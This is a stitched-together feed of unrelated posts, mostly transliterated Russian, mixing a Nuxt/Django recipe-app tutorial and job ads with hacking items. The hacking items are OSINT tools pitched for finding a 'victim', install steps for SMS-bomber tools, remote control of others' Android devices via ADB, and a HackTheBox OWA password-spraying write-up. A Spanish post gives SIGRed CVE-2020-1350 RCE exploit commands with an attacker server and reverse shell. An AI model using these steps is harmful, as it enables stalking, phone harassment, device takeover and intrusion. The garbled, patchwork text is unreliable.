Ishchem cheloveka po imeni  sherlock - eto utilita rabotaiushchaia cherez terminal, kotoraia probivaet cheloveka po niku vo mnogikh populiarnykh sotsial'nykh setiakh i saitakh. V ikh chislo vkhodiat takie proekty kak Facebook, Twitter, Twitch, TikTok, Telegram, Steam, GitHub, HackerNews i mnogie drugie populiarnye saity. V obshchei slozhnosti sherlock probivaet imia v bolee chem 90 sotsial'nykh setiakh i saitakh, chto pozvolit namnogo bystree naiti zhertvu.  Ustanovka  $ git clone https://github.com/sherlock-project/sherlock.git $ cd sherlock $ python3 -m pip install -r requirements.txt  Ispol'zovanie  $ python3 sherlock "username"  Bolee podrobnee pro dannuiu utilitu chitaite na GitHub

Kak sozdat' prilozhenie retseptov na Nuxt.js i Django Blagodaria poiavleniiu takikh sovremennykh kak React.js i Vue.js, izmenilo interfeisnuiu veb-razrabotku k luchshemu.Bol'shinstvo biznes prilozhennii eto rendering. Pri renderinge bol'shaia chast' kontenta otobrazhaetsia v brauzere s ispol'zovaniem JavaScript. Bol'shinstvo universal'nykh prilozhenie ispol'zuetsia dlia opisaniia koda JavaScript, kotoryi mozhet vypolniat'sia kak na storone klienta, tak i na storone servera. V etoi stat'e my sozdadim prilozhenie s ispol'zovaniem Nuxt.js.Itak v etom rukovodstve ia rasskazhu kak sozdat' prilozheniia s pomoshch'iu fraemvorka Nuxt.js. Nuxt.js - eto freimvork bolee vysokogo urovnia dlia razrabotki universal'nykh prilozhenii Vue.js.Chtoby sozdat' prilozhenie na vashem komp'iutere dolzhno byt' ustanovleno sleduiushchee: Python3 pip Npm. V etom razdele my nastroim server i sozdadim vse papki, kotorye nam nuzhny dlia zapuska i raboty dlia etogo zapustite novyi ekzempliar v terminale mkdir recipes_app Zatem my pereidem v katalog: cd recipes_app Teper' my ustanovim Pipenv s pomoshch'iu Pip i aktiviruem novuiu virtual'nuiu sredu pip install pipenv pipenv shell Teper' ustanovim Django s pomshch'iu Pipenv pipenv install django django-rest-framework django-cors-headers Teper' my sozdadim novyi proekt Django s imenem api django-admin startproject api cd api python manage.py startapp core Otkroite api/settings.py fail i obnovite ego sluduiushchim obrazom: # Application definition INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'rest_framework', # add this 'corsheaders', # add this 'core' # add this ] MIDDLEWARE = [ 'corsheaders.middleware.CorsMiddleware', # add this 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', ] # add this block below MIDDLEWARE CORS_ORIGIN_WHITELIST = ( 'localhost:3000', ) # add the following just below STATIC_URL MEDIA_URL = '/media/' # add this MEDIA_ROOT = os.path.join(BASE_DIR, 'media') # add this Davaite sozdadim shablon, chtoby opredelit' kakie elementy retsepta dolzhny khranit'sia v baze dannykh.Otkroite core/models.py fail i polnost'iu zamenite ego privedennym nizhe fragmentom: from django.db import models # Create your models here. class Recipe(models.Model): DIFFICULTY_LEVELS = ( ('Easy', 'Easy'), ('Medium', 'Medium'), ('Hard', 'Hard'), ) name = models.CharField(maxlength=120) ingredients = models.CharField(max_length=400) picture = models.FileField() difficulty = models.CharField(choices=DIFFICULTY_LEVELS, max_length=10) prep_time = models.PositiveIntegerField() prep_guide = models.TextField() def __str_(self): return "Recipe for {}".format(self.name) Nam nuzhny ekzempliary modeli v JSON, chtoby interfeis mog rabotat' s poluchennymi dannymi. Itak my sozdadim core/serializers.py fail i obnovim ego sleduiushchim obrazom: from rest_framework import serializers from .models import Recipe class RecipeSerializer(serializers.ModelSerializer): class Meta: model = Recipe fields = ("id", "name", "ingredients", "picture", "difficulty", "prep_time", "prep_guide") Otkroite core/admin.py fail i polnost'iu zamenite ego privedennym nizhe fragmentom: from django.contrib import admin from .models import Recipe # add this # Register your models here. admin.site.register(Recipe) # add this Sozdadim RecipeViewSetv core/views.py faile klass from rest_framework import viewsets from .serializers import RecipeSerializer from .models import Recipe class RecipeViewSet(viewsets.ModelViewSet): serializer_class = RecipeSerializer queryset = Recipe.objects.all() Pereidite k api/urls.py failu i polnost'iu zamenite ego privedennym nizhe kodom. from django.contrib import admin from django.urls import path, include # add this from django.conf import settings # add this from django.conf.urls.static import static # add this urlpatterns = [ path('admin/', admin.site.urls), path("api/", include('core.urls')) # add this ] # add this if settings.DEBUG: urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) Teper' sozdaite urls.py fail v corekataloge i vstav'te fragment nizhe: from django.urls import path, include from rest_framework.routers import DefaultRouter from .views import RecipeViewSet router = DefaultRouter() router.register(r'recipes', RecipeViewSet) urlpatterns = [ path("", include(router.urls)) ] Poskol'ku my nedavno sozdali model' retsepta i opredelili ee strukturu, nam nuzhno sozdat' fail migratsii i primenit' izmeneniia modeli k baze dannykh python manage.py makemigrations python manage.py migrate Teper' my sozdadim uchetnuiu zapis' dlia dostupa k interfeisu Administratora python manage.py createsuperuser Vam budet predlozheno vvesti imia pol'zovatelia, adres elektronnoi pochty i parol' dlia Adminki.Teper' my mozhem protestirovat' sozdannye API davaite zapustim server Django: python manage.py runserver Posle zapuska servera pereidite po adresu http: // localhost: 8000 / api / recipes /, chtoby ubedit'sia, chto on rabotaet.Esli u vas vse rabotaet zapolnite vse stroki i dalee my pereidem k konkretizatsii vneshnego interfeisa.Dlia etogo vyidite iz api kataloga ili perezapustite novyi terminal.Sozdadim nuxt prilozhenie, vyzyvaemoe client komandoi: npx create-nuxt-app client Posle zaversheniia ustanovki vam create-nuxt-app predlozhit neskol'ko voprosov o dopolnitel'nykh instrumentakh, kotorye neobkhodimo dobavit' Vvedite nazvanie proekta ili prosto nazhmite Enter Vvedite opisanie proekta Vyberite podderzhku PWA dlia ustanavlivaemykh funktsii Vyberite Universal'nyi dlia rezhima renderinga Vvedite imia avtora Vyberite npm dlia dispetchera paketov Itak vypolnim sleduiushchie komandy, chtoby zapustit' prilozhenie v rezhime razrabotki: cd client npm run dev Posle zapuska servera razrabotki pereidite po adresu http: // localhost: 3000, chtoby posmotret' inerfeis prilozheniia.V papke est' nuxt.config.js fail client, kotoryi soderzhit konfiguratsiiu dlia prilozheniia Nuxt.js. Prezhde chem prodolzhit', zagruzite etot zip-fail raspakuite ego i pomestite images/papku v static/ katalog.Sozdadim domashniuiu stranitsu nashego prilozhenniia,otkroite layouts/default.vue fail i zamenite ego sleduiushchim fragmentom nizhe: Davaite obnovim pages/index.vue fail Davaite zapustim interfeis prilozheniia i posmotrim kak on vygliadit http: // localhost: 3000 / npm run dev Sozdadim stranitsu so spiskom retseptov vyzyvaemyi RecipeCard.vue v components/kataloge, i obnovim ego: Zatem otkroite pages/recipes/index.vue i obnovite ego Davaite zapustim interfeis razrabotki i posetite http: // localhost: 3000 / recipes npm run dev Teper' nam nuzhno izmenit' asyncData metod chtoby sdelat' api zapros k bekendu Django i obnovit' dannye komponenta s rezul'tatom.Chto by u nas vse poluchilos' my dolzhny ustanovit' i nastroit' Axios npm install -s @nuxtjs/axios Posle Axios ustanovki otkroite nuxt.config.js fail i obnovite ego /_ ** Nuxt.js modules _/ modules: [, // Doc: https://bootstrap-vue.js.org/docs/ 'bootstrap-vue/nuxt', '@nuxtjs/axios' // add this ], // add this Axios object axios: { baseURL: "http://localhost:8000/api" }, Teper' otkroite pages/recipes/index.vue fail i zamenite Teper' my mozhem zapustit' interfeis prilozheniia chto by uvidet' kartochki retseptov http: // localhost: 3000 / recipes.Tak zhe vy mozhete udaliat' i dobovliat' elementy retsepta i posmotret', kak oni budut vygliadit'.Dobavim novyi retsept:

1.apt update && apt -y install python git 2.apt upgrade 3.pip install BeautifulSoup4 aiohttp typing 4.git clone https://github.com/antichristone/antichristone_x86 5.cd antichristone_x86  6: python3 main.py "Bomber"

HackTheBox, i na ee pri mere my poz nakomim sia s vek torami ata ki na Outlook Web App, nauchim sia generi rovat' spi sok parolei iz infy o pol' zovate lei, porabo taem s WS-Management i poishchem uiaz vimos ti v nas troi kakh Just Enough Administration (JEA). Zaod no ia pokazhu, kak sobirat' uchet nye dan nye na khos te, perenap ravliat' tra fik pri lozhe niia i delat' shell s pomoshch'iu bazy dan nykh. warning Pod kliu chat' sia k mashinam s HTB rekomen duet sia tol' ko cherez VPN. Ne delai eto go s komp' iute rov, gde est' vazh nye dlia tebia dan nye, tak kak ty oka zhesh' sia v obshchei seti s dru gimi uchas tni kami. Razvedka Skanirovanie portov Ma shina Reel2 ime et IP-adres 10.10.10.210 -- ia dobav liu ego v /etc/hosts, chto by mozh no bylo obra shchat' sia k khos tu po ime ni. 10.10.10.210 reel2.htb Liu baia ata ka nachina etsia so ska niro vaniia otkry tykh na khos te por tov. Eto neob khodimo dlia togo, chto by uznat', kakie sluzh by pri nima iut soedi nenie. Iskho dia iz poluchen noi informa tsii, my budem vybirat' put' dlia poluche niia toch ki vkho da i opo ry. Ia eto delaiu s pomoshch'iu sle duiushche go skrip ta, kotoryi ispol' zuet uti litu Nmap i pri nima et odin argu ment -- adres ska niru emo go khos ta. Sna chala on vypol niaet bys troe ska niro vanie por tov, zatem ska niru et nai den nye por ty s ispol' zovani em ime iushchikh sia skrip tov. ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 Re zul' tat raboty skrip taV rezul' tate ska niro vaniia ime em sle duiushchii spi sok otkry tykh por tov: port 80 -- veb-ser ver Microsoft IIS 8.5; port 443 -- obych no eshche odin port veb-ser vera, no s ispol' zovani em SSL; port 5985 -- etot port otve chaet za sluzh bu uda len nogo upravle niia WinRM; por ty 6001...6021 -- ne inte resu iut; port 8080 -- veb-ser ver Apache. Es tes tven no, nachina em s veb-ser vera. Tak, pri obra shchenii k kor nevomu katalo gu veb-ser vera nas vstre chaet star tovaia stra nitsa IIS. Star tovaia stra nitsa Microsoft IIS Perebor katalogov U IIS est' nes kol' ko defol tnykh katalo gov (k pri meru, /owa -- Microsoft Outlook), no vse rav no sto it pros kaniro vat' dos tupnye katalo gi. Dlia eto go mozh no ispol' zovat' shiroko izves tnye prog rammy dirsearch i DIRB, no ia obych no ispol' zuiu bolee bys tryi gobuster. Pri zapus ke ispol' zuem sle duiushchie paramet ry: dir -- ska niro vanie direk torii i fai lov; -k -- ne pro veriat' SSL-ser tifikat; -t [] -- koliches tvo potokov; -u [] -- URL-adres dlia ska niro vaniia; -x [] -- inte resu iushchie ras shireniia fai lov, perechis lennye cherez zapiatuiu; -w [] -- slo var' dlia perebo ra; --timeout [] -- vre mia ozhi daniia otve ta. gobuster dir -t 128 -u https:/ / reel2. htb/ -k -w / usr/ share/ wordlists/ dirbuster/ directory- list- lowercase- 2. 3- medium. txt -x html, php, aspx --timeout 30s Ob naruzhen nye pod katalo gi i fai ly na https://reel2.htbV rezul' tate nakhodim katalog owa. Pa nel' avto riza tsii Outlook Web AppNa IIS my nash li vse chto mog li, a tak kak pol' zovatel' skikh veb-pri lozhe nii ne obna ruzhe no, to perekho dim na veb-ser ver Apache. OSINT Port 8080 vyzyva et bol' shii inte res, tak kak na etom sai te my mozhem zaregis tri rovat' sia, a eto dast dos tup k dopol nitel' nym fun ktsi iam. Pa nel' avto riza tsii WallstantDa zhe esli sait ne ime et nikakikh uiaz vimos tei, on mozhet soder zhat' polez nuiu informa tsiiu. Nap rimer, ime na pol' zovate lei, ispol' zuemye tekh nologii, kos vennuiu informa tsiiu dlia sos tavle niia spis ka parolei. Poeto mu sra zu pos le regis tra tsii i avto riza tsii osta nav liva emsia na pol' zovate liakh. Do mash niaia stra nitsa avto rizo van nogo pol' zovate liaNai ti vek tor dlia dal' neishei ata ki bylo tiazhelo, poeto mu ia reshil pereb rat' uchet nye dan nye Outlook. Dlia sos tavle niia spis ka parolei ispol' zuem vsiu kos vennuiu informa tsiiu. U pol' zovate lia sven dan nykh bol' she, chem u dru gikh. Pro fil' pol' zovate lia svenSoz dadim dlia nego spi sok voz mozhnykh loginov. Kom biniruia vse voz mozhnye socheta niia ime ni Sven Svensson, my mozhem soz dat' sle duiushchii spi sok. Spi sok imen uchet nykh zapiseiDlia soz daniia parolei ia pop roboval uti litu bopscrk. Sut' prog ramm takogo roda v tom, chto my skar mli vaem im raz nye slo vari, pos ledova tel' nos ti sim volov ili dazhe pra vila sos tavle niia parolei, a oni generi ruiut slo var' dlia bru ta. Kak vid no na skrin shote nizhe, ia uka zal zna chenie sle duiushchikh paramet rov: mi nimal' naia dli na parolia -- 6; per voe imia -- sven; vto roe imia -- svensson; re levan tnye slo va cherez zapiatuiu -- this, 2020, summer, hot; is pol' zovat' leet-trans krip tsiiu (kog da, k pri meru, buk va e zamenia etsia na tsif ru 3, g -- na 9 i tak dalee) -- otka zyva emsia; is pol' zovat' trans krip tsiiu v raz nykh regis trakh -- da; ko liches tvo slov dlia kom biniro vaniia -- 3. V ito ge my polucha em slo var', soder zhashchii 9204 vari anta parolia! Re zul' tat raboty uti lity bopscrkV rezul' tate my poluchi li dva fai la dlia perebo ra uchet nykh dan nykh pol' zovate lia -- s logina mi i s parolia mi. Tochka vkhoda Brutfors OWA Es li ne zna esh', chto ispol' zovat' dlia bru ta, beri na zamet ku otlichnoe sreds tvo -- SprayingToolkit. Etot tul kit vkliu chaet v sebia nes kol' ko modulei. Nam nuzhen modul' Atomizer, kotoryi ispol' zuet sia dlia bru ta Lync, OWA i IMAP. Zapus kaem so sle duiushchi mi paramet rami: owa -- dlia perebo ra Outlook Web App; reel2.htb -- kor nevoi dlia katalo ga /owa adres; ~/tmp/bopscrk/tmp.txt -- spi sok parolei; ~/tmp/user.txt -- spi sok loginov; -i [H:M:S] -- vre men noi interval mezh du zap rosami; -t [] -- koliches tvo potokov. python3 atomizer. py owa reel2. htb ~/ tmp/ bopscrk/ tmp. txt ~/ tmp/ user. txt -i 0: 0: 1 -t 64 Re zul' tat raboty uti lity automizerPe rebor zanima et nekoto roe vre mia, no vse zhe nakhodim ver nuiu paru uchet nykh dan nykh. Automizer sokh ranit vse nai den nye uchet nye dan nye v fail owa_valid_accounts.txt. Outlook Web App pos le uspeshnoi avto riza tsii

Data Scientist Ishchem seichas Data Scientist v komandu, zanimaiushchuiusia razrabotkoi ITSM sistemy dlia obrabotki pol'zovatel'skikh obrashchenii.Zadachi, kotorye predstoit reshat':   Analiz dannykh i ikh polnoty dlia razrabotki modelei mashinnogo obucheniia; Sozdanie i testirovanie prognosticheskikh modelei dlia resheniia opredelennykh biznes-keisov; Otsenka i kontrol' kachestva modelei; Razrabotka algoritmov dlia primeneniia k massivam dannykh; Razrabotka modelei NLP; Avtomatizatsiia raboty sistem; Deep-Learning i neironnye seti dlia analiza teksta, izobrazhenii, golosa i resheniia zadach upravleniia kontentom; Razrabotka skriptov/konnektorov dlia integratsii s API interfeisami dlia sbora dannykh iz vnutrennikh biznes sistem i vneshnikh istochnikov.  S udovol'stviem poobshchaemsia, esli u tebia est' opyt:  raboty na pozitsii Data Scientist; uchastiia v komandnykh proektakh na iazyke Python3; vladenie stekom NLP/NLU (natural language processing/natural language understanding) - stemming (SnowballStemmer), one-hot encoding (OntHotEncoder), vektorizatsiia (TfIdf), busting (XGBoost, LGBM, ...); Khoroshee znanie teorii veroiatnosti, statistiki, ekonometriki; Nalichie reshennykh zadach v oblasti mashinnogo obucheniia; znanie SQL; sozdaniia API;  My predlagaem:  Rabotu v stabil'noi kompanii-liderov DIY rynka s unikal'noi korporativnoi kul'turoi; Uchastie v konferentsiiakh vmeste s nashei mezhdunarodnoi komandoi; Vozmozhnosti dlia professional'nogo razvitiia i izucheniia inostrannykh iazykov; Beluiu zarabotnuiu platu, sistemu premirovaniia, DMS, rasshirennyi sotsial'nyi paket i kompensatsiiu pitaniia; Ofis okolo m. Shabolovskaia (seichas rabotaem preimushchestvenno udalenno, v budushchem planiruem perekhod na chastichno udalennuiu rabotu). Probivaem cheloveka po 350 sotsial'nym setiam s pomoshch'iu Social Analyzer  Pered vami interfeis komandnoi stroki dlia poiska profilia cheloveka v bolee chem 350 sotsial'nykh setiakh, vebsaitakh i dal'neishego analiza. On vkliuchaet v sebia ogromnoe kolichestvo modulei sbora i analiza poluchennoi informatsii, a takzhe pozvoliaet vybrat', kakuiu kombinatsiiu modulei ispol'zovat' v protsesse rassledovaniia.   Sami zhe moduli obnaruzheniia ispol'zuiut spetsial'nyi mekhanizm, osnovannyi na razlichnykh metodakh obnaruzheniia, kotoryi prednaznachen dlia umen'sheniia kolichestva lozhnykh srabatyvanii. Dannyi proekt v nastoiashchee vremia ispol'zuetsia nekotorymi pravookhranitel'nymi organami v stranakh s ogranichennymi resursami.  Instruktsiia:  Ustanavlivaem Kali Linux i v nem propisyvaem  $ pip3 install social-analyzer  Ispol'zovanie:  $ python3 -m social-analyzer --cli --mode "fast" --username <<darkmask>> --websites "youtube pinterest tumblr" --output "pretty" --metadata --extract --trim

Ne tak davno, v fevrale, u menia sluchilsia zamechatel'nyi den': eshchio odin proekt-dolgostroi <<poletel>>. O chiom rech'? Rech' o moei davnei zadumke na temu ispol'zovaniia interpretatora Python v programmakh na C: ia realizoval dobavlenie khukov na Python v ReOpenLDAP. Sama po sebe tema, poniatnoe delo, bol'shaia, poetomu v takikh situatsiiakh ia pishu minimal'nyi kod na C, kotoryi sluzhit kak raz dlia proverki kontsepta i ego obkatki -- ego ochen' udobno zapuskat' pod instrumentami tipa Valgrind, kotorye nezamedlitel'no ukazhut na iavnye oshibki liapy v rabote s pamiat'iu. Odnako posle okonchaniia raboty ia ponial, chto sam po sebe minimal'nyi kod mozhet byt' polezen komu-to eshchio, krome menia. Pochemu? Potomu pered nachalom raboty ia naivno predpolagal, chto ofitsial'naia dokumentatsiia po C API pomozhet vsio sdelat' legko i bystro, no uvy! -- vniatnogo primera s poshagovym razborom ne nashiol. Chto zh, eto open source, detka, ne nravitsia -- sdelai sam.

Ishchem cheloveka po imeni  sherlock - eto utilita rabotaiushchaia cherez terminal, kotoraia probivaet cheloveka po niku vo mnogikh populiarnykh sotsial'nykh setiakh i saitakh. V ikh chislo vkhodiat takie proekty kak Facebook, Twitter, Twitch, TikTok, Telegram, Steam, GitHub, HackerNews i mnogie drugie populiarnye saity. V obshchei slozhnosti sherlock probivaet imia v bolee chem 90 sotsial'nykh setiakh i saitakh, chto pozvolit namnogo bystree naiti zhertvu.  Ustanovka  $ git clone https://github.com/sherlock-project/sherlock.git $ cd sherlock $ python3 -m pip install -r requirements.txt  Ispol'zovanie  $ python3 sherlock --help  Bolee podrobnee pro dannuiu utilitu chitaite na GitHub

Vzlom Android-ustroistva s pomoshch'iu ip-adresa.   Etot sposob smozhet pomoch', koda Vam neobkhodimo poluchit' dostup k svoemu ustroistvu, kotoroe nakhoditsia daleko. Nam potrebuetsia Kali Linux.  Ustanovka   apt-get install adb   sudo apt update   sudo apt-get install android-* tools-adb   sudo apt install android-tools-adb android-tools-fastboot   git clone https://github.com/Bafomet666/Satana-Android-Debug-Bridge   cd Satana-Android-Debug-Bridge-main  Zapusk     python3 SatanaADB.py  Otkryv eio, nam otkroetsia meniu. V niom vvodim tsifru "3", posle etogo, vvodim ip-adres, kotoryi Vy dolzhny byli uznat' ranee. (Metodami SI, esli ustroistvo ne Vashe)  Teper' u vas est' vozmozhnost' upravliat' kameroi, vkliuchat' i vykliuchat' Android-ustroistvo, a takzhe, mozhno upravliat' klaviaturoi i t.d.

Zdrastvuite, sluchilas' takaia problema, ia pisal parser iandeks novostei na selenium i mne prishlos' ispol'zovat' platnye proksi s avtorizatsiei. Ustanovil biblioteku seleniumwire, peredaiu ei slovar' s proksi, a v okne brauzera vot eto, chto del... The post problema s proksi na seleniumwire python3 first appeared on Poleznoe dlia razrabotchika.

Middle Backend-razrabotchik (Python)  Teachbase.ru - eto top komanda, kotoraia delaet luchshii servis dlia organizatsii distantsionnogo obucheniia, lider rynka onlain obucheniia Rossii po versii J'son & Partners Consulting i RBK. Nashi klienty - vedushchie rossiiskie i mezhdunarodnye kompanii, takie kak Skyeng, Domodedovo, Invitro, Sibur, Admitad, Ozon, Sberbank i mnogie drugie. Ezhednevno v servise Teachbase.ru prokhodiat obuchenie bolee 10 000 sotrudnikov raznykh kompanii.  S pomoshch'iu Teachbase protsess obucheniia i proverki znanii sotrudnikov stanovitsia namnogo proshche, nezavisimo ot togo nuzhno li protestirovat' novogo cheloveka, ili zakachat' bol'she znanii v uzhe rodnykh i opytnykh kolleg. Nam doveriaiut mnozhestvo izvestnykh kompanii: HeadHunter, Colins, LVMH, Ozon, Parfiumernyi butik "Zolotoe Iabloko", Invitro i mnogie drugie (60 000+ klientov).  Ezhegodno my zapuskaem desiatki obrazovatel'nykh proektov. Neskol'ko primerov: -platforma dlia shkol'nikov (bolee 60 tys. uchenikov) Rossiiskoe dvizhenie shkol'nikov. -platforma dlia obucheniia medsester Invitro. -geimifitsirovannyi obrazovatel'nyi portal dlia Sberbanka. -vnutrikorporativnyi portal dlia sotrudnikov LVMH v Rossii. Instruktsiia:    Ustanavlivaem Termux i propisyvaem komandy v konsol':    pkg install python3-pip  pkg install git  git clone https://github.com/sherlock-project/sherlock  cd sherlock  python3 -m pip install -r requirements.txt  python3 sherlock.py    Ispol'zovanie    Posle vvoda komand u vas poiavitsia meniu <<utility>>.  Nazhmite tsifru 2 > nazhmite Enter > vvedite nuzhnyi vam nomer

Sub 404 is a tool written in python which is used to check possibility of subdomain takeover vulnerabilty and it is fast as it is Asynchronous.WhyDuring recon process you might get a lot of subdomains(e.g more than 10k). It is not possible to test each manually or with traditional requests or urllib method as it is very slow. Using Sub 404 you can automate this task in much faster way. Sub 404 uses aiohttp/asyncio which makes this tool asynchronous and faster.  How it worksSub 404 uses subdomains list from text file and checks for url of 404 Not Found status code and in addition it fetches CNAME(Canonical name) and removes those URL which have target domain name in CNAME. It also combines result from subfinder and sublist3r(subdomain enumeration tool) if you don't have target subdomains as two is better than one. But for this sublist3r and subfinder tools must be installed in your system. Sub 404 is able to check 7K subdomains in less than 5 minutes.  Key Features:- Fast( as it is Asynchronous)- Uses two more tool to increase efficiency- Saves result in a text file for future reference- Umm thats it, nothing much !  How to use:Note: Only works on Python3... #bugbounty #bugbounty..

Iskal, pereiskal: sys.stdout dopisyvat' v konets oshibki A vse proshche: #!/bin/bash  cd /media/evg/Evgxxx/ python3 zip_xxx.py >> log.txt 2>> log.txt  https://linuxize.com/post/bash-redirect-stderr-stdout/  V Bash i drugikh obolochkakh Linux pri vypolnenii programmy ispol'zuiutsia tri standartnykh potoka vvoda-vyvoda. Kazhdyi potok predstavlen chislovym deskriptorom faila:  0- stdin - standartnyi potok vvoda. 1- stdout - standartnyi potok vyvoda. 2- stderr - standartnyi potok oshibok.

Teatime is an RPC attack framework aimed at making it easy to spot  misconfigurations in blockchain nodes. It detects a large variety of issues,  ranging from information leaks to open accounts, and configuration  manipulation.  The goal is to enable tools scanning for vulnerable nodes and minimizing  the risk of node-based attacks due to common vulnerabilities. Teatime uses  a plugin-based architecture, so extending the library with your own checks  is straightforward.  Please note that this library is still a PoC and lacks documentation. If there  are plugins you would like to see, feel free to contact me on Twitter!InstallationTeatime runs on Python 3.6+.  To get started, simply run  $ pip3 install teatime  Alternatively, clone the repository and run  $ pip3 install .  Or directly through Python's setuptools:  $ python3 setup.py install    ExampleTo get started, simply instantiate a Scanner class and pass in the  target IP, port, node type, and a list of instantiated plugins. Consider the  following sample to check whether a node is synced and mining:  from teatime... #bitcoin #blockchain #ethereum #framework #penetrationtesting #python #python3 #rpc #rpcclient..

10 klass, zadanie dlia tekh, kto do sikh por ne mozhet nichego napisat'. Osilit' 3 stroki uzhe mozhno bylo by. Tem bolee, chto voprosov u vas net i vsegda vse poniatno. U vas programmirovanie s ianvaria, profil', 3 uroka v nedeliu. Pora by uzhe khot' chto-to umet' delat'.  1) V tetradke dolzhno byt' zapisano segodniashnee/zavtrashnee chislo i reshenie vsekh 3-kh zadach.  2) Ne pol'zuias' tetrad'iu umet' napisat', zapustit' i proverit' rabotu kazhdoi zadachi.  Mne prisylat' resheniia ne nuzhno. Budete delat' offline.  Ssylki na uchebniki 8-9 klassa i ssylku na prezentatsiiu vykladyval ran'she. Na komp'iutere udobnee ispol'zovat' https://thonny.org Bez ustanovki na komp'iuter, priamo v brauzere (na komp'iutere ili telefone) mozhno ispol'zovat': https://repl.it/languages/python3 https://www.programiz.com/python-programming/online-compiler/ https://www.onlinegdb.com/online_python_compiler

Vy naverniaka znakomy s asciinema (github), eto udobnyi opensorsnyi instrument dlia zapisi deistvii v terminale. Zapisi sokhraniaiutsia v prostom dlia chteniia tekstovom formate, poetomu vesiat sovsem nemnogo, a veb-pleer po suti vosproizvodit tekst iz terminala vmesto video, tak chto liuboi kusok mozhno skopirovat' i ispol'zovat'. Gotovyi material mozhno zagruzit' v odno nazhatie na asciinema.org ili snachala otredaktirovat' lokal'no. Pleer mozhno vstroit' na sait bukval'no v tri stroki, bonusom prilagaiutsia vsiakie pliushki s oformleniem i sovmestimost'iu, i voobshche po sovokupnosti vsekh fich (i otsutstviia golovnoi boli) asciinema davno pereros vse analogi. Vot tol'ko est' nesostykovka: zapisi v proekte nazyvaiut asciicasts, po analogii so skrinkastami -- no vozmozhnosti strimit' sessiiu v real'nom vremeni ne bylo neskol'ko let, poka ne vyshel reliz 2.0, v kotorom s pomoshch'iu novogo formata failov udalos' realizovat' na udivlenie stabil'nuiu i udobnuiu razdachu na liuboi terminal v real-taime. O tom, kak eto rabotaet, o podvodnykh kamniakh i perspektivakh -- pod katom.
Mne nekogda bylo snimat' svoio video raspakovki -- ne terpelos' zapustit' eto prevoskhodnoe ustroistvo. NVIDIA Jetson Nano 2GB teper' mozhno kupit' vsego za 59 dollarov!!!

La gran chompie nos regala un exploit en python que consigue RCE explotando Sigred, ya sabeis, la vulnerabilidad critica en el servidor DNS de Windows (CVE-2020-1350) de las que ya os hablamos el pasado verano aqui.Tenemos el repo en: https://github.com/chompie1337/SIGRed_RCE_PoCUn atacante configuraria un dominio malicioso cuyo registro NS apunta a su servidor. Para la PoC, simplemente configuramos un reenviador condicional en la maquina victima para reenviar solicitudes de "dominio maligno" a la maquina atacante.  Luego en la maquina del atacante (probado en una VM Ubuntu 20.04.1) se configura un servidor Apache para que la victima descargue el HTA de la shell reversa. sudo python3 configure.py -ip IP_ATTACKER -p PORT_REVERSE_SHELL -hp PORT_APACHE_SERVER (default 80)Ahora para ejecutar el exploit tendremos que hacerlo con sudo, porque necesitamos escuchar en los puertos TCP y UDP 53:sudo python3 evildns.pyPosteriormente lanzamos:python3 exploit.py -ip WINDNS_VICTIM_IP -d EVIL_DOMAINY configuramos el listener para la shell reversa:python3 reverse_shell/server.py -p PORT_REVERSE_SHELLEl HTA es una version modificada de: ht..

Vvodim komandy po ocheredi, pri razlichnykh zaprosakh programmy - vsegda otvechaem Y:  -- apt update && apt upgrade  -- pkg install python && pkg install git  -- git clone https://github.com/Antaskin/smsbaher.git   -- cd smsbaher  -- pip3 install -r requirements.txt  -- python3 smsbaher.py  Dlia posleduiushchikh zapuskov budet dostatochno vvesti poslednii komandu.

!! Bekend-razrabotchik (Python) Utair vkhodit v top-5 rossii skikh aviaperevozchikov i perevozit ezhegodno okolo 8 mln chelovek. Aviakompaniia letaet po 150 napravleniiam, bolee 60 iz kotorykh dostupny tol'ko passazhiram Utair. V parke Utair 65 samoletov. Osnovnoi  punkt peresadki -- moskovskii  aeroport Vnukovo, na kotoryi  prikhoditsia bolee 160 rei sov Utair ezhednevno. Shtab-kvartira Utair raspolagaetsia v Surgute. Aviakompaniia vkhodit v reestr operatorov IOSA s 2008 goda. Utair -- eto vo mnogom eshche i IT-kompaniia. My zanimaemsia innovatsionnoi  razrabotkoi  kommercheskikh servisov i sozdaem vysokonagruzhennye proekty. Nashimi servisami pol'zuiutsia milliony passazhirov i kazhdoe izmenenie v produkte nakhodit momental'nyi otklik. S nashimi razrabotkami ne stydno vystupat' na bol'shoi  konferentsii. My ishchem razrabotchika Python, kotoryi  smozhet snachala vlit'sia, a potom i vozglavit' proekty, kotorye my realizuem. My ishchem ne krutogo solo-programmista, a komandnogo igroka, kotoryi  smozhet povyshat' svoi uroven' vmeste so vsei komandoi. My stremimsia ispol'zovat' vostrebovannye rynkom tekhnologii, ne izobretaia svoi velosipedy. Poetomu vy mozhete byt' uvereny, chto smozhete progressirovat' v nuzhnom tempe.   Obiazannosti:    Rabotat' nad uluchsheniem servisov aviakompanii; Razrabatyvat' i proektirovat' otkazoustoi chivoe i vysokoproizvoditel'noeprogrammnoe obespechenie, kotoroe legko podderzhivat', soprovozhdat'; Otsenivat' tekhnicheskii  dolg i planirovat' refaktoring.; Dokumentirovat' razrabatyvaemye resheniia; Nakhodit' optimal'nye resheniia s uchetom potrebnostei  biznesa; Uchastvovat' v planirovanii sprintov. Povyshat' kachestvennye metriki komandy; Nasha tsel' -- i 99% uptime, i bystrye postavki v boi  dlia eksperimental'nykh servisov s minimal'nymi zatratami na razrabotku (sokrashchenie time to market).    Trebovaniia:   - vysshee tekhnicheskoe obrazovanie; - ne menee 3 let raboty v smezhnoi  dolzhnosti, iz nikh ne menee 2 let - s python; - navyki raboty s sistemami monitoringa; - zhelatelen opyt proektirovaniia HA/HL sistem; - khoroshee znanie: python3, shell, git, flask, celery, redis, mongodb, column databases, design patterns - ponimanie osnovnykh printsipov razrabotki PO, automation systems, unit tests; - vladenie anglii skim iazykom na urovne chteniia professional'noi  literatury.   Usloviia:   - mesto raboty: rabotat' mozhno 